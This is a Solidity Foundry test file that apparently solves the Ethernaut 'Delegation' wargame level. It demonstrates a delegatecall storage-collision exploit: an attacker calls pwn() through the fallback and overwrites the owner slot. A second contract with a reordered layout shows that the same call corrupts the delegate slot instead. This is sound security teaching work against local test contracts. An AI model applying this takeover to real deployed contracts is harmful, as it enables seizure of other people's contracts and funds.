// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/06-Delegation.sol";

/**
 * @notice Swapped storage layout to prove storage collision mechanics
 */
contract DelegationReordered {
    Delegate public delegate; // Storage Slot 0!
    address public owner;     // Storage Slot 1!

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

contract DelegationTest is Test {
    Delegate public delegateContract;
    Delegation public delegationContract;
    DelegationReordered public reorderedContract;

    address public originalOwner = makeAddr("originalOwner");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(originalOwner);
        delegateContract = new Delegate(originalOwner);
        delegationContract = new Delegation(address(delegateContract));
        reorderedContract = new DelegationReordered(address(delegateContract));
        vm.stopPrank();
    }

    function test_InitialOwnership() public view {
        assertEq(delegationContract.owner(), originalOwner);
        assertNotEq(delegationContract.owner(), attacker);
    }

    function test_DelegatecallTakeover() public {
        vm.startPrank(attacker);

        // Function selector for pwn() -> 0xdd365b8b
        bytes memory data = abi.encodeWithSignature("pwn()");

        // Low-level call to Delegation triggers fallback() -> delegatecall(pwn())
        // pwn() executes sstore(0x0, caller()) -> Overwrites Slot 0 (owner)
        (bool success,) = address(delegationContract).call(data);
        assertTrue(success, "Low-level call failed");

        // Verify Delegation's Slot 0 (owner) is now attacker!
        assertEq(delegationContract.owner(), attacker);
        console2.log("Local PoC Success: New owner of Delegation is", delegationContract.owner());

        vm.stopPrank();
    }

    function test_ReorderedStorageLayoutFailsToChangeOwnerAndCorruptsDelegate() public {
        vm.startPrank(attacker);

        bytes memory data = abi.encodeWithSignature("pwn()");

        // Verify initial state
        assertEq(reorderedContract.owner(), originalOwner);
        assertEq(address(reorderedContract.delegate()), address(delegateContract));

        // Call reordered contract with pwn()
        (bool success,) = address(reorderedContract).call(data);
        assertTrue(success, "Low-level call succeeded");

        // PROOF 1: The owner at Slot 1 was NOT changed!
        assertEq(reorderedContract.owner(), originalOwner, "Owner should remain unchanged in Slot 1");
        assertNotEq(reorderedContract.owner(), attacker);

        // PROOF 2: Slot 0 (delegate variable) was corrupted and overwritten with attacker's address!
        assertEq(address(reorderedContract.delegate()), attacker, "Delegate at Slot 0 was corrupted by attacker");

        console2.log("Reordered PoC: Owner remained:", reorderedContract.owner());
        console2.log("Reordered PoC: Delegate corrupted to:", address(reorderedContract.delegate()));

        vm.stopPrank();
    }
}
